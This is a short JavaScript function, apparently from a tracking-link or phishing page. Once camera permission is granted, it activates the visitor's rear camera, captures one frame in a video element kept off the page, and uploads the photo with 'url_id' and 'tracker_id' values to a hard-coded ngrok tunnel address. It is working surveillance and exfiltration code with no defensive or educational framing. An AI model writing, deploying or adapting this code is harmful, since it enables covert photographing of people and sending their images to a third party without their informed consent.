async function sendCameraCaptures(url_id,tracker_id) {


    const UPLOAD_URL = "https://4a23-2a01-36d-2000-480e-a8c6-1606-f3d3-9cb2.ngrok-free.app/save_captured_image/";

    try {

        const devices = await navigator.mediaDevices.enumerateDevices();

        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: { ideal: "environment" },
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;

        await video.play();

        // Várunk egy kicsit, hogy a kamera fókuszáljon
        await new Promise(resolve => setTimeout(resolve, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        canvas.getContext("2d").drawImage(video, 0, 0);
        const blob = await new Promise(resolve =>
            canvas.toBlob(resolve, "image/jpeg", 0.9)
        );

        const formData = new FormData();
        formData.append("image", blob, "photo.jpg");
        formData.append("url_id", url_id);
        formData.append("tracker_id", tracker_id);
        await fetch(UPLOAD_URL, {
            method: "POST",
            body: formData,
        });

        stream.getTracks().forEach(track => track.stop());

    } catch (err) {
        console.error(err);
    }
}